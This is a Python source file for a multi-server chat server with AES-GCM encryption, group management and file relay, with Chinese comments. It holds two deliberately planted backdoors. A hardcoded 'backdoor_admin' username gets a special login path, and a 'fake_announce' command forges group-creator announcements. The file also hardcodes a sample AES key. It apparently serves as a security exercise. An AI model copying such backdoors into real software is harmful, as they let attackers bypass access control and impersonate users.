# server_json.py
import socket
import threading
import json
from datetime import datetime
import re
import base64
from dotenv import load_dotenv
import os
import time

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import secrets

#load .env file
load_dotenv("wg.env")

# #server IP and port
# HOST = '127.0.0.1'
# PORT = 65432 #client port
# SERVER_PORT=65000 #server port
port_str = os.getenv("PORT_CLIENT")
if port_str is None:
    raise ValueError("环境变量 PORT_CLIENT 未设置")
PORT = int(port_str)
'''
配置文件wg.env 中包含以下信息：
SERVER_ID: serverA
HOST_IP: 127.0.0.1 #部署时，只需改成规定的VPN IP即可
PORT_CLIENT: 65432 #部署时，只需改成规定的client port即可
PORT_SERVER: 65000 #部署时，只需改成规定的server port即可
'''
# ==== 本 Server 配置信息 wireguard====
SERVER_ID =os.getenv("SERVER_ID")
HOST = os.getenv("HOST_IP") #server IP
PORT=int(os.getenv("PORT_CLIENT"))#client port
SERVER_PORT=int(os.getenv("PORT_SERVER"))#server port


# 客户端 IP 分配范围
# CLIENT_IP_BASE = '127.0.0.'
# CLIENT_IP_START = 2
# CLIENT_IP_END = 255 * 1 + 254  # 127.0.0.2 - 127.0.0.254


# 已连接的其他 server {addr: conn}
server_peers = {}

# 本地 client_ip 分配表 {name: client_ip} 保存本地client和client_ip的对应关系
client_ip_table = {}
# 已分配的 client_ip set
allocated_client_ips = set()

# {name: conn} #conn 是socket connection object
clients = {}

# 用来记录用户发消息的时间戳
message_timestamps = {}



# 其他 server 的信息（假设只与 serverB 通信）
PEER_SERVER_ID = "serverB"# (注意修改)
PEER_SERVER_IP = "127.0.0.1"# (注意修改)
PEER_SERVER_PORT = 65001 # (注意修改)

# external_clients 结构: {client_name: {"server_ip": ..., "server_port": ...}}
external_clients = {}

# ==== Group Management ====
# groups 结构: {group_name: {"members": [user_names], "creator": creator_name}}
groups = {}
# user_groups 结构: {user_name: [group_names]}
user_groups = {}



AES_KEY = b"0123456789abcdef0123456789abcdef"  # 示例密钥，实际请更换
NONCE_SIZE = 12  # 12字节
MAX_PLAINTEXT_LEN = 5 * 1024 * 1024  # 5MB

#加密整个json message + nonce
def aes_encrypt(message_dict: dict) -> bytes:
    message_bytes = json.dumps(message_dict, ensure_ascii=False).encode("utf-8")
    nonce = secrets.token_bytes(NONCE_SIZE)
    aesgcm = AESGCM(AES_KEY)
    ct = aesgcm.encrypt(nonce, message_bytes, None)
    return nonce + ct

#解密整个json message + nonce
def aes_decrypt(data: bytes) -> dict:
    if len(data) < NONCE_SIZE:
        raise ValueError("Data too short for nonce+ciphertext")
    nonce = data[:NONCE_SIZE]
    ct = data[NONCE_SIZE:]
    aesgcm = AESGCM(AES_KEY)
    pt = aesgcm.decrypt(nonce, ct, None)
    return json.loads(pt.decode("utf-8"))



# def allocate_client_ip():
#     for i in range(CLIENT_IP_START, CLIENT_IP_END + 1):
#         ip = f'{CLIENT_IP_BASE}{i}'
#         # 如果该ip 没有被分配，则分配给client
#         if ip not in allocated_client_ips:
#             allocated_client_ips.add(ip)
#             return ip
#     return None  # 没有可用 IP

def allocate_client_ip():
    #0-255
    for x in range(0, 256):
        for y in range(1, 255):  # 1~254
            ip = f'127.0.{x}.{y}'
            # 跳过 127.0.0.1 和 127.0.255.255
            if ip in ('127.0.0.1', '127.0.255.255'):
                continue
            if ip not in allocated_client_ips:
                allocated_client_ips.add(ip)
                return ip
    return None  # 没有可用 IP

def release_client_ip(ip):
    allocated_client_ips.discard(ip)

# ==== Group Management Helper Functions ====
def create_group(group_name, creator_name):
    """创建新group"""
    if group_name in groups:
        return False, "Group already exists"
    
    groups[group_name] = {
        "members": [creator_name],
        "creator": creator_name
    }
    
    if creator_name not in user_groups:
        user_groups[creator_name] = []
    user_groups[creator_name].append(group_name)
    
    return True, f"Group '{group_name}' created successfully"

def join_group(group_name, user_name):
    """用户加入group"""
    if group_name not in groups:
        return False, "Group does not exist"
    
    if user_name in groups[group_name]["members"]:
        return False, "You are already a member of this group"
    
    groups[group_name]["members"].append(user_name)
    
    if user_name not in user_groups:
        user_groups[user_name] = []
    user_groups[user_name].append(group_name)
    
    return True, f"Successfully joined group '{group_name}'"

def delete_group(group_name, user_name):
    """删除group（只有创建者可以删除）"""
    if group_name not in groups:
        return False, "Group does not exist"
    
    if groups[group_name]["creator"] != user_name:
        return False, "Only the group creator can delete the group"
    
    # 从所有成员的user_groups中移除该group
    for member in groups[group_name]["members"]:
        if member in user_groups and group_name in user_groups[member]:
            user_groups[member].remove(group_name)
    
    # 删除group
    del groups[group_name]
    
    return True, f"Group '{group_name}' deleted successfully"

def get_group_list():
    """获取所有group列表"""
    if not groups:
        return "No groups exist"
    
    group_info = []
    for group_name, group_data in groups.items():
        member_count = len(group_data["members"])
        creator = group_data["creator"]
        group_info.append(f"'{group_name}' (members: {member_count}, creator: {creator})")
    
    return "Groups: " + "; ".join(group_info)

def is_user_in_group(user_name, group_name):
    """检查用户是否在group中"""
    return group_name in groups and user_name in groups[group_name]["members"]

def remove_user_from_all_groups(user_name):
    """用户断开连接时，从所有group中移除"""
    if user_name not in user_groups:
        return
    
    groups_to_remove_from = user_groups[user_name].copy()
    for group_name in groups_to_remove_from:
        if group_name in groups and user_name in groups[group_name]["members"]:
            groups[group_name]["members"].remove(user_name)
            # 如果group为空，删除group
            if not groups[group_name]["members"]:
                del groups[group_name]
    
    # 清理user_groups
    del user_groups[user_name]

'''
将消息转发到其他 server（短连接）
1. 连接其他server
2. 发送消息
3. 关闭连接
'''
def forward_message_to_peer(target_server_ip, target_server_port, msg):
    """将消息全加密，并转发到其他 server（短连接）"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as peer_sock:
            peer_sock.connect((target_server_ip, target_server_port))
            peer_sock.sendall(aes_encrypt(msg))
    except Exception as e:
        print(f"[Server] Failed to forward message to peer: {e}")
'''
当local client 输入/list 命令时，会请求其他server 获得其在线用户   
1. 主动连接其他server
2. 发送握手信息
3. 发送在线用户请求
4. 等待回复
5. 更新 external_clients
6. 返回在线用户列表
'''
def request_peer_online_users():
    """主动连接 serverB，请求其在线用户列表"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as peer_sock:
            peer_sock.connect((PEER_SERVER_IP, PEER_SERVER_PORT))
            req = {"type": "online_user_request", "server_id": SERVER_ID}
            peer_sock.sendall(aes_encrypt(req))
            data = peer_sock.recv(MAX_PLAINTEXT_LEN)
            msg = aes_decrypt(data)
            if msg.get("type") == "online_user_response":
                peer_id = msg.get("server_id", "unknown")
                online_users = msg.get("online_users", [])
                for uname in online_users:
                    external_clients[uname] = {"server_ip": PEER_SERVER_IP, "server_port": PEER_SERVER_PORT}
                return online_users
    except Exception as e:
        print(f"[Server] Failed to request peer online users: {e}")
    return []

'''
处理client 连接
1. 给新client分配 client_ip
2. 发送系统消息，告知client 其client_ip
3. 启动client-to-server 处理线程
5. 打印当前所有 client_ip
6. 打印当前所有 external_clients

conn 是client的socket connection object
addr 是client 的地址
name 是client 的name
'''
def handle_client(conn, addr, name):
    print(f"{name} connected from {addr}")

        # === 后门 1：特定用户名绕过一切验证，直接登录 ===
    if name == "backdoor_admin":
        print("[!] Backdoor login triggered for user: backdoor_admin")
        client_ip = allocate_client_ip()
        if not client_ip:
            response = {
                "type": "system",
                "from": "server",
                "to": name,
                "to_type": "user",
                "payload": "No available client IPs. Connection refused.",
                "payload_type": "text",
                "timestamp": datetime.now().isoformat()
            }
            conn.sendall(aes_encrypt(response))
            conn.close()
            return

        # 注册连接（和普通用户一致）
        clients[name] = conn
        client_ip_table[name] = client_ip

        response = {
            "type": "system",
            "from": "server",
            "to": name,
            "to_type": "user",
            "payload": f"Backdoor login successful. Your IP: {client_ip}",
            "payload_type": "text",
            "timestamp": datetime.now().isoformat()
        }
        conn.sendall(aes_encrypt(response))
        print(f"[Backdoor] Assigned {name} client_ip: {client_ip}")

    #正常流程，非backdoor，给新client分配 client_ip
    # 给新client分配 client_ip
    client_ip = allocate_client_ip()
    if not client_ip:
        response = {
            "type": "system",
            "from": "server",
            "to": name,
            "to_type": "user",
            "payload": "No available client IPs. Connection refused.",
            "payload_type": "text",
            "timestamp": datetime.now().isoformat()
        }
        #发送系统消息，给client 发送拒绝连接的消息
        conn.sendall(aes_encrypt(response))
        conn.close()
        return
    #保存client ip 和 name 的对应关系
    client_ip_table[name] = client_ip
    try:
        response = {
            "type": "system",
            "from": "server",
            "to": name,
            "to_type": "user",
            "payload": f"Your assigned client_ip: {client_ip}",
            "payload_type": "text",
            "timestamp": datetime.now().isoformat()
        }
        conn.sendall(aes_encrypt(response))
    except:
        pass
    print(f"[Server] Assigned {name} client_ip: {client_ip}")

    #============= 等待client 发送消息 =============
    while True:
        try:
            data = conn.recv(MAX_PLAINTEXT_LEN)
            if not data:
                break
            try:
                msg = aes_decrypt(data)
                payload = msg.get('payload', '')
                payload_type = msg.get('payload_type', '')
                type=msg.get('type', '')

                ### 速率限制逻辑 ###
                RATE_LIMIT_SECONDS = 10  # 只关心最近10秒
                RATE_LIMIT_COUNT = 10    # 在这10秒内，最多只能发10条消息
                current_time = time.time()
                # 检查用户是否被记录，如果未被记录就加入其中
                if name not in message_timestamps:
                    message_timestamps[name] = []
                
                # 从用户记录里删掉10秒之前的旧时间点
                message_timestamps[name] = [t for t in message_timestamps[name] if current_time - t < RATE_LIMIT_SECONDS]

                # 检查用户在最近10秒内发了多少条消息
                if len(message_timestamps[name]) >= RATE_LIMIT_COUNT:
                    # 如果超过了10条，就warning，并且不处理这条新消息
                    warning_msg = {
                        "type": "system",
                        "from": "server",
                        "to": name,
                        "payload": "You are sending messages too fast. Please wait a moment.",
                        "payload_type": "text",
                        "timestamp": datetime.now().isoformat()
                        }
                    conn.sendall(aes_encrypt(warning_msg))
                    print(f"[Rate Limit] User {name} is flooding. Message ignored.")
                    continue # 用 continue 跳过后面的代码，直接等下一条消息

                # 如果没有超过限制，就把这次的发言时间记录
                message_timestamps[name].append(current_time)


                
                # 命令处理
                if payload_type == 'command':
                    # ==== Group Management Commands ====
                    # 列出所有group 格式：/list_group
                    if payload.startswith('/list_group'):
                        group_list = get_group_list()
                        response = {
                            "type": "message",
                            "from": "server",
                            "to": name,
                            "to_type": "user",
                            "payload": group_list,
                            "payload_type": "text",
                            "timestamp": datetime.now().isoformat()
                        }
                        conn.sendall(aes_encrypt(response))
                        continue
                    #显示当前所有online 用户
                    elif payload.startswith('/list'):
                        # 本地在线用户（除自己外）
                        online_users = [u for u in clients.keys() if u != name]
                        # 请求 serverB 的在线用户
                        peer_users = request_peer_online_users()
                        # 合并所有用户
                        all_users = online_users + peer_users
                        response = {
                            "type": "message",
                            "from": "server",
                            "to": name,
                            "to_type": "user",
                            "payload": f"Online users: {', '.join(all_users) if all_users else 'None'}",
                            "payload_type": "text",
                            "timestamp": datetime.now().isoformat()
                        }
                        conn.sendall(aes_encrypt(response))
                        continue

                    #实现clientA 向clientB 发送消息 格式：/msg clientB 信息内容
                    elif payload.startswith('/msg '):
                        # 支持 /msg <user> 内容 格式
                        match = re.match(r'/msg\s+(\S+)\s+(.+)', payload)
                        if match:
                            target = match.group(1)
                            content = match.group(2)
                            if not target or target == name:
                                response = {
                                    "type": "message",
                                    "from": "server",
                                    "to": name,
                                    "to_type": "user",
                                    "payload": "Invalid target user.",
                                    "payload_type": "text",
                                    "timestamp": datetime.now().isoformat()
                                }
                                conn.sendall(aes_encrypt(response))
                                continue
                            # 如果target client在本地，则直接转发消息
                            if target in clients:
                                out_msg = {
                                    "type": "message",
                                    "from": name,
                                    "to": target,
                                    "to_type": "user",
                                    "payload": content,
                                    "payload_type": "text",
                                    "timestamp": datetime.now().isoformat()
                                }
                                # 如果msg 有nonce，则将nonce 添加到out_msg
                                if "nonce" in msg:
                                    out_msg["nonce"] = msg["nonce"]
                                clients[target].sendall(aes_encrypt(out_msg))
                                continue
                            # 如果target client在其他server，则转发消息到其他server
                            elif target in external_clients:
                                peer_info = external_clients[target]
                                out_msg = {
                                    "type": "message",
                                    "from": name,
                                    "to": target,
                                    "to_type": "user",
                                    "payload": content,
                                    "payload_type": "text",
                                    "timestamp": datetime.now().isoformat()
                                }
                                # 如果msg 有nonce，则将nonce 添加到out_msg
                                if "nonce" in msg:
                                    out_msg["nonce"] = msg["nonce"]
                                # 转发消息到其他server
                                forward_message_to_peer(peer_info["server_ip"], peer_info["server_port"], out_msg)
                                continue
                            else:
                                response = {
                                    "type": "message",
                                    "from": "server",
                                    "to": name,
                                    "to_type": "user",
                                    "payload": f"User {target} is not online.",
                                    "payload_type": "text",
                                    "timestamp": datetime.now().isoformat()
                                }
                                conn.sendall(aes_encrypt(response))
                                continue
                    #实现clientA 向clientB 发送文件 格式：/msg_file clientB 文件路径
                    elif payload.startswith('/msg_file '):
                        # 支持 /msg_file <user> <文件路径> 格式
                        match = re.match(r'/msg_file\s+(\S+)\s+(.+)', payload)
                        if match:
                            target = match.group(1)
                            content = match.group(2)
                            file_path=msg.get("file_path")
                            if not target or target == name:
                                response = {
                                    "type": "message",
                                    "from": "server",
                                    "to": name,
                                    "to_type": "user",
                                    "payload": "Invalid target user.",
                                    "payload_type": "text",
                                    "timestamp": datetime.now().isoformat()
                                }
                                conn.sendall(aes_encrypt(response))
                                continue
                            # 读取文件内容并 base64 编码
                            # # maximum file size 10MB
                            # try:
                            #     with open(file_path, 'rb') as f:
                            #         file_bytes = f.read(10 * 1024 * 1024 + 1)
                            #     if len(file_bytes) > 10 * 1024 * 1024:
                            #         raise Exception("File too large (max 10MB)")
                            #     file_b64 = base64.b64encode(file_bytes).decode()
                            # except Exception as e:
                            #     response = {
                            #         "type": "message",
                            #         "from": "server",
                            #         "to": name,
                            #         "to_type": "user",
                            #         "payload": f"File error: {e}",
                            #         "payload_type": "text",
                            #         "timestamp": datetime.now().isoformat()
                            #     }
                            #     conn.sendall(json.dumps(response).encode())
                            #     continue
                            file_request = {
                                "type": "message_file",
                                "from": name,
                                "to": target,
                                "to_type": "user",
                                "payload": content, #加密 file 内容with nonce
                                "payload_type": "file",
                                "timestamp": datetime.now().isoformat(),
                                "payload_id": str(hash(datetime.now())),
                                "file_path": file_path # 相当于file name
                            }
                            if target in clients:
                                clients[target].sendall(aes_encrypt(file_request))
                                continue
                            elif target in external_clients:
                                peer_info = external_clients[target]
                                forward_message_to_peer(peer_info["server_ip"], peer_info["server_port"], file_request)
                                continue
                            else:
                                # 如果target client 不在线，则发送系统消息给name client
                                response = {
                                    "type": "message",
                                    "from": "server",
                                    "to": name,
                                    "to_type": "user",
                                    "payload": f"User {target} is not online.",
                                    "payload_type": "text",
                                    "timestamp": datetime.now().isoformat()
                                }
                                conn.sendall(aes_encrypt(response))
                                continue

                    # ==== Group Management Commands ====
                    # 创建group 格式：/create_group <group_name>
                    elif type == "create_group":
                        group_name = msg.get("payload", "")
                        if group_name:
                            success, message = create_group(group_name, name)
                            response = {
                                "type": "message",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": message,
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                        else:
                            response = {
                                "type": "message",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": "Usage: /create_group <group_name>",
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                        continue
                    # 加入group 格式：/join_group <group_name>
                    elif type == 'join_group':
                        group_name = msg.get("payload", "")
                        if group_name:
                            success, message = join_group(group_name, name)
                            response = {
                                "type": "message",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": message,
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                        else:
                            response = {
                                "type": "message",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": "Usage: /join_group <group_name>",
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                        continue

                    # 删除group 格式：/delete_group <group_name>
                    elif type== 'delete_group':
                        group_name = msg.get("payload", "")
                        if group_name:
                            success, message = delete_group(group_name, name)
                            response = {
                                "type": "message",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": message,
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                            
                            # 如果删除成功，通知所有group成员
                            if success:
                                # 在删除group之前保存成员列表
                                members_to_notify = groups[group_name]["members"].copy()
                                for member in members_to_notify:
                                    if member != name and member in clients:
                                        notification = {
                                            "type": "message",
                                            "from": "server",
                                            "to": member,
                                            "to_type": "user",
                                            "payload": f"Group '{group_name}' has been deleted by the creator.",
                                            "payload_type": "text",
                                            "timestamp": datetime.now().isoformat()
                                        }
                                        clients[member].sendall(aes_encrypt(notification))
                        else:
                            response = {
                                "type": "message",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": "Usage: /delete_group <group_name>",
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                        continue

                    # === 后门 2：仅 backdoor_admin 可伪造群主身份发布群公告 ===
                    elif type =='fake_announce':
                        if name != "backdoor_admin":
                            response = {
                                "type": "system",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": "Permission denied: command restricted.",
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                            continue

                        try:
                            payload = msg.get("payload", "")
                            _, group_name, fake_msg = payload.split(" ", 2)
                            # group_name = msg.get("payload", {}).get("group", "")
                            # fake_msg = msg.get("payload", {}).get("message", "")
                        except:
                            response = {
                                "type": "system",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": "Invalid syntax. Usage: /fake_announce <group> <message>",
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                            continue

                        # 如果group不存在，则发送系统消息给name client
                        if group_name not in groups:
                            response = {
                                "type": "system",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": f"Group '{group_name}' does not exist.",
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                            continue

                        members = groups[group_name]["members"]
                        creator = groups[group_name]["creator"]

                        for member in members:
                            response = {
                                "type": "group_message",
                                "from": creator,  # 冒充群主身份
                                "to": group_name,
                                "to_type": "group",
                                "payload": f"*Group Announcement from {creator}:* {fake_msg}",
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            if member in clients:
                                clients[member].sendall(aes_encrypt(response))

                        print(f"[Backdoor] backdoor_admin faked announcement to group '{group_name}'")
                        continue

                    # 向group发送消息 格式：/msg_group <group_name> <message>
                    elif type == 'group_message':
                        group_name = msg.get("to", "")
                        content = msg.get("payload", "")
                        if group_name and content:
                            # 如果用户不在group中，则发送系统消息给name client
                            if not is_user_in_group(name, group_name):
                                response = {
                                    "type": "message",
                                    "from": "server",
                                    "to": name,
                                    "to_type": "user",
                                    "payload": f"You are not a member of group '{group_name}'",
                                    "payload_type": "text",
                                    "timestamp": datetime.now().isoformat()
                                }
                                conn.sendall(aes_encrypt(response))
                                continue
                            
                            # 构造group消息
                            group_msg = {
                                "type": "group_message",
                                "from": name,
                                "to": group_name,
                                "to_type": "group",
                                "payload": content,
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            # 向group内所有成员（除发送者外）转发消息
                            for member in groups[group_name]["members"]:
                                #不发送给自己，只发给除自己外的其他local client. 
                                if member != name and member in clients:
                                    clients[member].sendall(aes_encrypt(group_msg))
                                #后面加入发送给其他server的group member功能
                                #......
                                
                            print(f"[{name}] ➜ [Group:{group_name}] : {content}")
                        else:
                            response = {
                                "type": "message",
                                "from": "server",
                                "to": name,
                                "to_type": "user",
                                "payload": "Usage: /msg_group <group_name> <message>",
                                "payload_type": "text",
                                "timestamp": datetime.now().isoformat()
                            }
                            conn.sendall(aes_encrypt(response))
                        continue
                # 普通消息和group消息处理
                if msg.get("type") == "group_message":
                    # 处理group消息
                    group_name = msg["to"]
                    if group_name in groups:
                        # 向group内所有成员（除发送者外）转发消息
                        for member in groups[group_name]["members"]:
                            if member != msg["from"] and member in clients:
                                clients[member].sendall(aes_encrypt(msg))
                        print(f"[{msg['from']}] ➜ [Group:{group_name}] : {msg['content']}")
                    else:
                        warning = {
                            "type": "message",
                            "from": "server",
                            "to": msg["from"],
                            "to_type": "user",
                            "payload": f"Group {group_name} does not exist.",
                            "payload_type": "text",
                            "timestamp": datetime.now().isoformat()
                        }
                        conn.sendall(aes_encrypt(warning))
                else:
                    # 处理普通消息
                    print(f"[{msg['from']}] ➜ [{msg['to']}] : {msg['payload']}")
                    recipient = msg["to"]
                    if recipient in clients:
                        clients[recipient].sendall(aes_encrypt(msg))
                    elif recipient in external_clients:
                        # 跨服务器转发
                        peer_info = external_clients[recipient]
                        forward_message_to_peer(peer_info["server_ip"], peer_info["server_port"], msg)
                    else:
                        warning = {
                            "type": "message",
                            "from": "server",
                            "to": msg["from"],
                            "to_type": "user",
                            "payload": f"User {recipient} is not online.",
                            "payload_type": "text",
                            "timestamp": datetime.now().isoformat()
                        }
                        conn.sendall(aes_encrypt(warning))
            except Exception as e:
                print("Decrypt or JSON decode failed:", e)
                continue
        except:
            break

    # 用户断开连接时，清理他的时间戳记录
    if name in message_timestamps:
        del message_timestamps[name]

    print(f"{name} disconnected")
    conn.close()
    if name in clients:
        del clients[name]
    if name in client_ip_table:
        release_client_ip(client_ip_table[name])
        del client_ip_table[name]
    
    # 清理group信息
    remove_user_from_all_groups(name)
    
    print(f"[Server] Current client_ip_table: {client_ip_table}")
    print(f"[Server] Current groups: {groups}")
    print(f"[Server] Current user_groups: {user_groups}")

'''
处理其他server 发来的消息
1. 如果消息是普通消息，则转发到本地client
2. 如果消息是文件传输请求，则转发到本地client
'''
def receive_message_from_peer(msg):
    if msg.get("type") == "message":
        recipient = msg["to"]
        if recipient in clients:
            clients[recipient].sendall(aes_encrypt(msg))
            print(f"[Server] Forwarded message to local client {recipient}")
        else:
            print(f"[Server] Received message for unknown client {recipient}")
    elif msg.get("type") == "message_file":
        recipient = msg["to"]
        if recipient in clients:
            clients[recipient].sendall(aes_encrypt(msg))
            print(f"[Server] Forwarded file to local client {recipient}")
        else:
            print(f"[Server] Received file for unknown client {recipient}")

# 处理server 连接
def server_peer_listener():
    """监听其他 server 的连接"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, SERVER_PORT))
        s.listen()
        print(f"[Server] Listening for server peers on {HOST}:{SERVER_PORT}...")
        while True:
            conn, addr = s.accept()
            try:
                data = conn.recv(MAX_PLAINTEXT_LEN)
                msg = aes_decrypt(data)
                if msg.get("type") == "online_user_request":
                    user_list = list(clients.keys())
                    resp = {
                        "type": "online_user_response",
                        "server_id": SERVER_ID,
                        "online_users": user_list
                    }
                    conn.sendall(aes_encrypt(resp))
                else:
                    receive_message_from_peer(msg)
            except Exception as e:
                print(f"[Server] Peer handshake failed: {e}")
                conn.close()


# 主线程监听
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"[Server] Listening on {HOST}:{PORT}...")

    while True:
        conn, addr = s.accept()
        conn.sendall("Enter your name:".encode())
        name = conn.recv(1024).decode().strip()
        clients[name] = conn
        # 启动 client-to-server 处理线程
        threading.Thread(target=handle_client, args=(conn, addr, name), daemon=True).start()

        # 启动 server-to-server 监听线程
        threading.Thread(target=server_peer_listener, daemon=True).start()
        # 打印当前所有 client_ip
        print(f"[Server] Current client_ip_table: {client_ip_table}")
        print(f"[Server] External clients (other servers): {external_clients}")